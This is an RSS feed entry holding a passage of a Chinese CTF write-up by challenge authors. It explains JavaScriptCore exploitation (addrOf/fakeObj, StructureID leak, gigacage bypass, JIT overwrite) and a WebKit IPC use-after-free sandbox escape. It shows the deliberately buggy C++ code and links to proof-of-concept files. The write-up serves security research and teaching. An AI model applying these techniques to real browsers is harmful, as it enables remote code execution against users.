<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>长亭技术专栏</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/</link>
<description>安全攻防技术分享</description>
<language>zh-cn</language>
<lastBuildDate>Sun, 15 Dec 2019 11:18:40 +0800</lastBuildDate>
<item>
<title>如何绕过JSC最新缓解措施并逃逸Safari沙箱</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-12-14-96069221.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/96069221&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b9eec9b5bff18bab36a19ac491a71b20_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;本文讨论了一种绕过JavaScriptCore(JSC)最新的StructureID随机化的技术实践，并阐述了通过WebKit IPC逃逸Safari沙箱的具体利用技术。作为以上技术的载体，我们将整个过程呈现在了Real World CTF 2019 决赛当中 (&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//realworldctf.com&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;realworldctf.com&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;), 期待能为Safari/WebKit浏览器的安全研究添砖加瓦。 &lt;/p&gt;&lt;p&gt;本文内容与 &lt;a class=&quot;member_mention&quot; href=&quot;https://www.zhihu.com/people/8e54c6f265d1887503798285c3f993a7&quot; data-hash=&quot;8e54c6f265d1887503798285c3f993a7&quot; data-hovercard=&quot;p$b$8e54c6f265d1887503798285c3f993a7&quot;&gt;@许文&lt;/a&gt; 共同创作。感谢&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.cc.gatech.edu/~mxu80/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;徐萌&lt;/a&gt;为本文的改善提出的建议。感谢 &lt;a class=&quot;member_mention&quot; href=&quot;https://www.zhihu.com/people/372a9eeb0267cf732f5b73265f3dc307&quot; data-hash=&quot;372a9eeb0267cf732f5b73265f3dc307&quot; data-hovercard=&quot;p$b$372a9eeb0267cf732f5b73265f3dc307&quot;&gt;@shiki7&lt;/a&gt; 与我一起把这个题成功呈现到Real World CTF中。&lt;/p&gt;&lt;h2&gt;攻击JavaScriptCore&lt;/h2&gt;&lt;p&gt;在本次比赛当中，我们刻意在最新版本JavaScriptCore中引入了一个runtime漏洞。通过引入未预期的JIT优化副作用，我们可以成功利用这个漏洞。&lt;/p&gt;&lt;h2&gt;对FastStructureCache的分析&lt;/h2&gt;&lt;p&gt;我们为RegExp相关的structure创建了一个分配缓存，名字叫做FastStructureCache。其完整内容可以从&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//gist.githubusercontent.com/HQ1995/96d8922f915bc44ca794611344324a8f/raw/41d80298dc276d22d1efcc2b63a4ccf93266ed68/patch.diff&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;这里&lt;/a&gt;找到。&lt;/p&gt;&lt;p&gt;下面是对这个漏洞关键部分做的一些注解。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cpp&quot;&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;FastStructureCache&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JSNonFinalObject&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JSNonFinalObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Structure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fastCacheStructure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fastCacheSizeMax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fastCacheSizeUsed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Structure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;createStructureFastPath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
        &lt;span class=&quot;n&quot;&gt;SGlobalObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;globalObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JSValue&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prototype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
        &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TypeInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typeInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClassInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;classInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fastCacheStructure&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;fastCacheStructure&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Structure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fastCacheSizeMax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fastCacheSizeMax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// * [1]
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;// Later, we will set the correct globalObject and prototype
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;fastCacheStructure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Structure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;globalObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prototype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typeInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;classInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fastCacheSizeUsed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fastCacheSizeMax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;Structure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;return_value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fastCacheStructure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fastCacheSizeUsed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// * [2]
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;            &lt;span class=&quot;c1&quot;&gt;// set the correct global object and prototype
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;return_value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setPrototypeWithoutTransition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prototype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;return_value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setGlobalObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;globalObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;fastCacheSizeUsed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;return_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Structure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;globalObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prototype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typeInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;classInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;protected&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;FastStructureCache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Structure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;structure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在 [1] 处，我们创建了缓存。尽管现在它里面的prototype都是不正确的，但是我们在后面真正要使用它们的时候会在 [2] 处设置对应的正确prototype。这至少引入了两个bug。首先，type info和 class info是永远不会变的，所以后期使用这些structure的对象的时候这些信息全都是错误的。不过我们并没有去研究过这个bug是不是可以利用的或者怎么利用。然后，图1 比较了&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/WebKit/webkit/blob/master/Source/JavaScriptCore/runtime/StructureInlines.h%23L39&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Structure::create&lt;/a&gt;中的常规过程和FastStructureCache的区别，显然，FastStructureCache没有用didBecomePrototype()这个函数去标记这个对象已经成了prototype。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-49d9b493879883da9dad2a8b7f8964fc_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;847&quot; data-rawheight=&quot;980&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;847&quot; data-original=&quot;https://pic1.zhimg.com/v2-49d9b493879883da9dad2a8b7f8964fc_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-49d9b493879883da9dad2a8b7f8964fc_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;847&quot; data-rawheight=&quot;980&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;847&quot; data-original=&quot;https://pic1.zhimg.com/v2-49d9b493879883da9dad2a8b7f8964fc_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-49d9b493879883da9dad2a8b7f8964fc_b.jpg&quot;/&gt;&lt;figcaption&gt;图1. 错误的创建structure的过程&lt;/figcaption&gt;&lt;/figure&gt;&lt;h2&gt;基本漏洞利用原语构建&lt;/h2&gt;&lt;p&gt;根据lokihardt的&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//bugs.chromium.org/p/project-zero/issues/detail%3Fid%3D1649&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;一些注解&lt;/a&gt;，我们可以得知JSC根本就不允许Proxy对象出现在Native数组的原型链当中。但是，有了这个bug我们便可以打破这个JSC的assumption并做一些有趣的事情。&lt;/p&gt;&lt;p&gt;图2 阐述了其中因由，假设已经有一个RegExp对象出现在了一个Native数组的原型链中。当我们试图把一个Proxy对象设置在这个RegExp的原型链当中，不会触发任何的转换来把这个数组转换为swithToSlowPutArrayStorage类型的数组。这样来说，我们便可以照葫芦画瓢的利用lokihardt已经讲过的技巧来使用HasIndexedProperty这个IR来向JSC引入非预期的副作用。并造成类型混淆。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-1a80005a6e6e89e73e619dc6e6a9e622_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1101&quot; data-rawheight=&quot;806&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1101&quot; data-original=&quot;https://pic3.zhimg.com/v2-1a80005a6e6e89e73e619dc6e6a9e622_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-1a80005a6e6e89e73e619dc6e6a9e622_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1101&quot; data-rawheight=&quot;806&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1101&quot; data-original=&quot;https://pic3.zhimg.com/v2-1a80005a6e6e89e73e619dc6e6a9e622_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-1a80005a6e6e89e73e619dc6e6a9e622_b.jpg&quot;/&gt;&lt;figcaption&gt;图2. JSC在为对象设置Prototype时候的检查&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;我们给出了addrOf和fakeObj的原语的&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//gist.githubusercontent.com/HQ1995/96d8922f915bc44ca794611344324a8f/raw/049e280021d72b390df923bbda59216af0996fa2/poc.js&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;POC&lt;/a&gt;,它的执行效果如下:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;➜  ./jsc pwn.js
0x00007fa42ebdc240
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;    &lt;span class=&quot;m&quot;&gt;27955&lt;/span&gt; segmentation fault  ./jsc pwn.js&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;泄露StructureID&lt;/h2&gt;&lt;p&gt;起初当我们在Mojave上开发&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//twitter.com/insu_yun_en/status/1153742447115153413%3Fs%3D20&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;full-chain利用&lt;/a&gt;之际，structureID的7-bit entropy已经被引入Webkit master。为了利用该漏洞，在那时我们便成功找到了一种基于JIT编译器的通用绕过方法。&lt;/p&gt;&lt;p&gt;无独有偶，BlackHat EU 上的一个&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;talk&lt;/a&gt;也公开了一种基于runtime function的方法来泄露structureID的方法。这些方法都是基于一个简单有效的事实: JSC里面并不是所有的内建函数，机制都依赖正确的structureID。&lt;/p&gt;&lt;p&gt;图3阐述了利用Function.prototype.toString.call()来泄露structureID的过程。我们需要伪造三个对象，其中包括一个没有正确structureID的伪造函数对象。如此一来，我们不仅能泄露structureID的entropy，还可以泄露一个butterfly指针。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-bcfd602672681079f086bc3de1722656_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;609&quot; data-rawheight=&quot;647&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;609&quot; data-original=&quot;https://pic3.zhimg.com/v2-bcfd602672681079f086bc3de1722656_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-bcfd602672681079f086bc3de1722656_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;609&quot; data-rawheight=&quot;647&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;609&quot; data-original=&quot;https://pic3.zhimg.com/v2-bcfd602672681079f086bc3de1722656_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-bcfd602672681079f086bc3de1722656_b.jpg&quot;/&gt;&lt;figcaption&gt;图3. 泄露StructureID。(蓝色代表伪造的对象，绿色代表正常的对象)&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;我们给出了一个泄露structureID的&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//gist.githubusercontent.com/HQ1995/96d8922f915bc44ca794611344324a8f/raw/41d80298dc276d22d1efcc2b63a4ccf93266ed68/leakid.js&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;代码实现&lt;/a&gt;,执行效果如下:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;➜  ./jsc pwn.js
Structure ID: 8230700009a5e&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;绕过JSC 隔离堆并执行任意代码&lt;/h2&gt;&lt;p&gt;大家经常使用的绕过隔离堆的方法有两个，&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/LinusHenze/WebKit-RegEx-Exploit/blob/master/pwn.js%23L176&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;WASM’s Memory buffer&lt;/a&gt;或者是&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html%23L128&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Object’s butterfly&lt;/a&gt;。因为gigacage没有对它们做隔离。因为我们在泄露structureID还可以顺便泄露butterfly指针，向图4描绘的这样，用第二种方法在butterfly上伪造一个对象来实现任意地址读写可以少写很多代码。&lt;/p&gt;&lt;p&gt;从任意地址读写到代码执行，我们使用了覆盖JIT代码内存的陈词滥调。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-831be9cdbf273890308dd046123ac91d_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;795&quot; data-rawheight=&quot;280&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;795&quot; data-original=&quot;https://pic2.zhimg.com/v2-831be9cdbf273890308dd046123ac91d_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-831be9cdbf273890308dd046123ac91d_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;795&quot; data-rawheight=&quot;280&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;795&quot; data-original=&quot;https://pic2.zhimg.com/v2-831be9cdbf273890308dd046123ac91d_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-831be9cdbf273890308dd046123ac91d_b.jpg&quot;/&gt;&lt;figcaption&gt;图4. 通过在butterfly上面伪造一个对象来绕过gigacage隔离堆。&lt;/figcaption&gt;&lt;/figure&gt;&lt;h2&gt;攻击WebKit IPC进程并逃逸沙箱&lt;/h2&gt;&lt;p&gt;由于现代浏览器广泛使用了多进程模型以及沙箱墨香，Broker进程IPC便成为了最有力的沙箱逃逸攻击面之一。Chrome Windows在最近的一次成功沙箱逃逸便是利用了Broker IPC的内存破坏。&lt;/p&gt;&lt;p&gt;如图5中阐述，WebKit的Broker IPC server由多个消息代理组合而成，可以双向通信，同步或者异步通信。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-13f61e2d9d4d9690b930cc1c255ed723_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;541&quot; data-rawheight=&quot;373&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;541&quot; data-original=&quot;https://pic4.zhimg.com/v2-13f61e2d9d4d9690b930cc1c255ed723_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-13f61e2d9d4d9690b930cc1c255ed723_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;541&quot; data-rawheight=&quot;373&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;541&quot; data-original=&quot;https://pic4.zhimg.com/v2-13f61e2d9d4d9690b930cc1c255ed723_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-13f61e2d9d4d9690b930cc1c255ed723_b.jpg&quot;/&gt;&lt;figcaption&gt;图5. 渲染进程与其他进程的交互。&lt;/figcaption&gt;&lt;/figure&gt;&lt;h2&gt;一个UI进程中的Use-After-Free漏洞的故事&lt;/h2&gt;&lt;p&gt;通过回滚AAPL的一个&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//gist.github.com/HQ1995/96d8922f915bc44ca794611344324a8f/raw/3b605cbb50324ad5f45a651ad9fe93145c03a412/sandbox.diff&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;patch&lt;/a&gt;，我们在Webkit IPC进程中引入了一个bug。我们删掉了VideoFullScreenMessageProxy::setHasVideo中对contextID的检查。这样一来选手们在触发漏洞的时候就可以轻松点。不停的触发这一条消息就能触发漏洞。&lt;/p&gt;&lt;p&gt;如图6中描述，这些消息Proxy都是通过WTF::HashMap来建议contextID和一些对象之间的映射。因为WTF::HashMap中，0这个index实际上是表示这个位置是空的。但是我们把这个ID的检查删掉了。这样就可以给它发ID为0的消息，造成存入和查找的逻辑不一致。想办法多存一点来触发哈希表的rehash，这个过程会有UAF的情况出现。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-705fe50daf15727bb62c0e354fee8005_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1273&quot; data-rawheight=&quot;310&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1273&quot; data-original=&quot;https://pic2.zhimg.com/v2-705fe50daf15727bb62c0e354fee8005_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-705fe50daf15727bb62c0e354fee8005_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1273&quot; data-rawheight=&quot;310&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1273&quot; data-original=&quot;https://pic2.zhimg.com/v2-705fe50daf15727bb62c0e354fee8005_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-705fe50daf15727bb62c0e354fee8005_b.jpg&quot;/&gt;&lt;figcaption&gt;图 6. 危险的裸指针&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;由于指向PlaybackSessionModel的这个指针是裸指针，因此在触发rehash时它将变为悬空指针。 一旦VideoFullscreenInterfaceMac对象被解构，则将触发UAF。&lt;/p&gt;&lt;p&gt;通过向UI进程发送以下消息可以触发UAF。&lt;/p&gt;&lt;div 